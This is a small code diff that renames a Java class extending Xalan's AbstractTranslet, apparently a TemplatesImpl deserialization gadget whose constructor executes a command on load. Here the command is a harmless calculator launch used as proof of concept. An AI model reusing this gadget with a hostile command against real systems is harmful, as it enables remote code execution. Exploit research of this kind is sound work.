@@ -6,9 +6,9 @@ import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 
-public class TemplatesEvilClass extends AbstractTranslet {
+public class EvilClass extends AbstractTranslet {
 
-    public TemplatesEvilClass() throws Exception {
+    public EvilClass() throws Exception {
         try{
             Runtime.getRuntime().exec("open -a Calculator");
         } catch (Exception e) {
